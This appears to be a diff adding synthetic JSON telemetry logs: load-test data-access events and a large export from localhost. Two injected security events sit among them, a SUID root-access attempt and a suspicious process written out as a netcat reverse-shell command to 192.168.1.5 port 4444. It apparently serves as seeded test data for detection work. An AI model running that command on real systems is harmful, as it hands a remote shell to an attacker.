+{"timestamp": "2026-03-06T06:32:03.803835Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "127.0.0.1", "endpoint": "/data", "query": "", "status": "success"}
+{"timestamp": "2026-03-06T06:32:05.304044Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_20", "status": "success"}
+{"timestamp": "2026-03-06T06:32:06.367023Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "127.0.0.1", "endpoint": "/data", "query": "", "status": "success"}
+{"timestamp": "2026-03-06T06:32:07.376856Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_21", "status": "success"}
+{"timestamp": "2026-03-06T06:32:08.964510Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "127.0.0.1", "endpoint": "/data", "query": "", "status": "success"}
+{"timestamp": "2026-03-06T06:32:09.476459Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_22", "status": "success"}
+{"timestamp": "2026-03-06T06:32:11.569585Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_23", "status": "success"}
+{"timestamp": "2026-03-06T06:32:11.599985Z", "component": "TELEMETRY", "event_type": "data_export", "ip": "127.0.0.1", "endpoint": "/export", "size_mb": 1737, "status": "success"}
+{"timestamp": "2026-03-06T06:32:13.675912Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_24", "status": "success"}
+{"timestamp": "2026-03-06T06:32:15.783286Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_25", "status": "success"}
+{"event_type": "root_access_attempt", "ip": "10.0.0.50", "user": "www-data", "method": "suid_binary_exploit", "timestamp": "2026-03-06T06:32:17Z"}
+{"timestamp": "2026-03-06T06:32:17.856086Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_26", "status": "success"}
+{"timestamp": "2026-03-06T06:32:19.968706Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_27", "status": "success"}
+{"event_type": "suspicious_process", "ip": "10.0.0.10", "process_name": "nc -e /bin/bash 192.168.1.5 4444", "timestamp": "2026-03-06T06:32:20Z"}
+{"timestamp": "2026-03-06T06:32:22.064758Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_28", "status": "success"}
+{"timestamp": "2026-03-06T06:32:24.156743Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_29", "status": "success"}
+{"timestamp": "2026-03-06T06:32:26.244017Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_30", "status": "success"}
+{"timestamp": "2026-03-06T06:32:28.344106Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_31", "status": "success"}
+{"timestamp": "2026-03-06T06:32:30.414097Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_32", "status": "success"}
+{"timestamp": "2026-03-06T06:32:32.500584Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_33", "status": "success"}
+{"timestamp": "2026-03-06T06:32:34.602461Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_34", "status": "success"}
+{"timestamp": "2026-03-06T06:32:36.685270Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_35", "status": "success"}
+{"timestamp": "2026-03-06T06:32:38.785400Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_36", "status": "success"}
+{"timestamp": "2026-03-06T06:32:40.885245Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_37", "status": "success"}
+{"timestamp": "2026-03-06T06:32:42.973671Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_38", "status": "success"}
+{"timestamp": "2026-03-06T06:32:45.077710Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_39", "status": "success"}
+{"timestamp": "2026-03-06T06:32:47.181145Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_40", "status": "success"}
+{"timestamp": "2026-03-06T06:32:49.296055Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_41", "status": "success"}
+{"timestamp": "2026-03-06T06:32:51.386760Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_42", "status": "success"}
+{"timestamp": "2026-03-06T06:32:53.476498Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_43", "status": "success"}
+{"timestamp": "2026-03-06T06:32:55.580666Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_44", "status": "success"}
+{"timestamp": "2026-03-06T06:32:57.694412Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_45", "status": "success"}
+{"timestamp": "2026-03-06T06:32:59.789396Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_46", "status": "success"}
+{"timestamp": "2026-03-06T06:33:01.885002Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_47", "status": "success"}
+{"timestamp": "2026-03-06T06:33:03.989228Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_48", "status": "success"}
+{"timestamp": "2026-03-06T06:33:06.089778Z", "component": "TELEMETRY", "event_type": "data_access", "ip": "10.0.0.99", "endpoint": "/data", "query": "load_test_49", "status": "success"}
